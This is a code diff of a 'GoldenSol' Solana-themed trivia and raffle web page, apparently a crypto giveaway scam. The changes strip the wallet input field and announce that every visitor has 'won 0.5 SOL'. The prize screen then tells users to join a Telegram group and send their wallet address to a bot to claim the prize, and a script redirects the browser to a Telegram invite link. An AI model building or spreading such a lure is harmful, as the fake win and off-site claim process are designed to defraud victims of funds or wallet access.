@@ -16,7 +16,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 20px;
+      padding: 10px;
       overflow: hidden;
       position: relative;
     }
@@ -31,7 +31,7 @@
     /* Content Over Background */
     .container {
       background-color: rgba(0, 0, 0, 0.95);
-      padding: 40px;
+      padding: 20px;
       border-radius: 15px;
       box-shadow: 0 0 20px #0f0;
       max-width: 500px;
@@ -40,36 +40,30 @@
       position: relative;
       z-index: 1;
       transition: transform 0.3s;
+      margin: 5px;
     }
     h1 {
-      font-size: 3em;
+      font-size: 2.5em;
       margin-bottom: 10px;
+      position: relative;
       color: #0f0;
       animation: glitch 1s infinite;
     }
-    p { font-size: 1.2em; margin-bottom: 20px; color: #0f0; }
-    input {
-      background-color: #000;
-      color: #0f0;
-      border: 2px solid #0f0;
-      border-radius: 5px;
-      padding: 12px;
+    p {
       font-size: 1em;
-      width: 80%;
-      margin-bottom: 20px;
-      transition: border-color 0.3s, transform 0.2s;
+      margin-bottom: 15px;
+      color: #0f0;
     }
-    input:focus { border-color: #0f0; outline: none; transform: scale(1.02); }
     button {
       background-color: #0f0;
       color: #000;
-      padding: 12px 25px;
+      padding: 10px 20px;
       font-size: 1em;
       border: none;
       border-radius: 5px;
       cursor: pointer;
       transition: background-color 0.3s, transform 0.2s;
-      width: 60%;
+      width: 70%;
       margin-top: 10px;
     }
     button:hover { background-color: #0c0; transform: translateY(-2px); }
@@ -89,19 +83,19 @@
       color: #0f0;
       border: 2px solid #0f0;
       border-radius: 5px;
-      padding: 10px 20px;
-      margin: 5px 0;
+      padding: 8px 15px;
+      margin: 4px 0;
       width: 100%;
       max-width: 300px;
       cursor: pointer;
       transition: background-color 0.3s, transform 0.2s;
     }
     .option:hover { background-color: #0c0; transform: scale(1.05); color: #000; }
-    .raffle-container { display: none; margin-top: 20px; text-align: center; }
-    .raffle-number { font-size: 4em; color: #0f0; margin-bottom: 20px; animation: blink 1s infinite; }
+    .raffle-container { display: none; margin-top: 15px; text-align: center; }
+    .raffle-number { font-size: 3.5em; color: #0f0; margin-bottom: 15px; animation: blink 1s infinite; }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-    .raffle-message { font-size: 1.5em; color: #0f0; }
-    .prize-container { display: none; margin-top: 20px; text-align: center; animation: pulse 2s infinite; }
+    .raffle-message { font-size: 1.3em; color: #0f0; }
+    .prize-container { display: none; margin-top: 15px; text-align: center; animation: pulse 2s infinite; }
     @keyframes pulse {
       0% { transform: scale(1); box-shadow: 0 0 10px #0f0; }
       50% { transform: scale(1.05); box-shadow: 0 0 20px #0c0; }
@@ -109,7 +103,7 @@
     }
     .prize-container h1 {
       font-size: 2em;
-      margin-bottom: 15px;
+      margin-bottom: 10px;
       animation: glitch 1s infinite, epicPulse 2s infinite;
       color: #ccff00;
       text-shadow: 0 0 20px #ccff00, 0 0 30px #99cc00;
@@ -118,17 +112,26 @@
       0%, 100% { transform: scale(1); opacity: 1; }
       50% { transform: scale(1.1); opacity: 0.8; }
     }
-    .prize-details { margin-top: 20px; font-size: 1.2em; color: #0f0; display: none; }
-    .prize-details a { color: #0f0; text-decoration: none; font-weight: bold; }
+    .prize-details { margin-top: 15px; font-size: 1.2em; color: #0f0; display: none; }
+    .prize-details a { 
+      color: #0f0; 
+      text-decoration: none; 
+      font-weight: bold;
+      animation: pulse-link 2s infinite;
+    }
     .prize-details a:hover { text-decoration: underline; }
+    @keyframes pulse-link {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
     .hidden { display: none; }
     @media (max-width: 600px) {
       h1 { font-size: 2em; }
-      .container { padding: 30px; }
-      input { width: 100%; }
+      .container { padding: 20px; }
       button { width: 80%; }
       .option { max-width: 100%; }
-      #result-message, .raffle-number, .raffle-message, .prize-details { font-size: 1.5em; }
+      #result-message, .raffle-number, .raffle-message, .prize-details { font-size: 1.3em; }
     }
   </style>
 </head>
@@ -136,13 +139,12 @@
   <!-- Matrix Rain Canvas Background -->
   <canvas id="matrix"></canvas>
 
-  <!-- Wallet Input Container -->
+  <!-- Start Game Container -->
   <div class="container" id="wallet-container">
     <h1>GoldenSol</h1>
-    <p>Enter your Solana wallet to join the exclusive GoldenSol raffle!</p>
-    <input type="text" id="wallet" placeholder="Enter your Solana wallet address" />
-    <button onclick="submitWallet()">Join Now</button>
-    <p style="margin-top: 15px; color: #0f0;">* Every participant is guaranteed a prize! *</p>
+    <p>Press the button to start the game!</p>
+    <button onclick="submitWallet()">Start Game</button>
+    <p style="margin-top: 15px; color: #0f0;">* Everyone has a chance to win prizes! *</p>
   </div>
 
   <!-- Trivia Quiz Container -->
@@ -174,10 +176,11 @@
   <!-- Prize Details Container -->
   <div class="container prize-container" id="prize-container">
     <h1>Congratulations!</h1>
-    <p id="result-message">You have won up to 1 SOL!</p>
+    <p id="result-message">You have won 0.5 SOL!</p>
     <button id="get-prize-button" onclick="displayPrizeDetails()">Get Your Prize</button>
     <div class="prize-details">
-      <p>Additionally, you can receive another prize by contacting our <a href="https://x.com/Soltreasuref" target="_blank">X Account</a>.</p>
+      <p>Please join our Telegram group to claim your prize. Send your wallet address and our bot will send you the prize within 5 minutes!</p>
+      <p><a href="https://t.me/+PSTkbn8FAPs0ZWQ0" target="_blank">Join Telegram Group</a></p>
     </div>
   </div>
 
@@ -207,9 +210,7 @@
         const x = i * fontSize;
         const y = drops[i] * fontSize;
         ctx.fillText(text, x, y);
-        if (y > canvas.height && Math.random() > 0.975) {
-          drops[i] = 0;
-        }
+        if (y > canvas.height && Math.random() > 0.975) { drops[i] = 0; }
         drops[i]++;
       }
     }
@@ -220,19 +221,12 @@
     });
 
     let treasureNumber;
-    const correctAnswer = 'C'; 
+    const correctAnswer = 'C';
     let raffleInterval;
 
     function submitWallet() {
-      const wallet = document.getElementById('wallet').value.trim();
-      const walletContainer = document.getElementById('wallet-container');
-      const quizContainer = document.getElementById('quiz-container');
-      if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(wallet)) {
-        walletContainer.style.display = 'none';
-        quizContainer.style.display = 'block';
-      } else {
-        alert('Please enter a valid Solana wallet address.');
-      }
+      document.getElementById('wallet-container').style.display = 'none';
+      document.getElementById('quiz-container').style.display = 'block';
     }
 
     function selectOption(selected) {
@@ -290,7 +284,6 @@
       prizeDetails.style.display = 'block';
       const celebrationSound = document.getElementById('celebration-sound');
       celebrationSound.play();
-      // Start continuous confetti for 5 seconds
       startConfetti(5000);
       setTimeout(() => {
         window.location.href = 'https://t.me/+7xdnh-cjoTZjNDFk';
@@ -298,8 +291,7 @@
     }
 
     function resetQuiz() {
-      const quizContainer = document.getElementById('quiz-container');
-      quizContainer.style.display = 'none';
+      document.getElementById('quiz-container').style.display = 'none';
       document.getElementById('wallet-container').style.display = 'block';
     }
 
@@ -317,10 +309,8 @@
       confetti.style.opacity = '0.8';
       confetti.style.transform = 'rotate(45deg)';
       confetti.style.animation = 'confetti-fall 3s forwards';
-      confetti.addEventListener('animationend', () => {
-        confetti.remove();
-      });
-      confettiContainer.appendChild(confetti);
+      confetti.addEventListener('animationend', () => { confetti.remove(); });
+      document.getElementById('confetti-container').appendChild(confetti);
     }
 
     function startConfetti(duration) {
@@ -340,6 +330,7 @@
   </script>
 </body>
 </html>
+
 
 
 
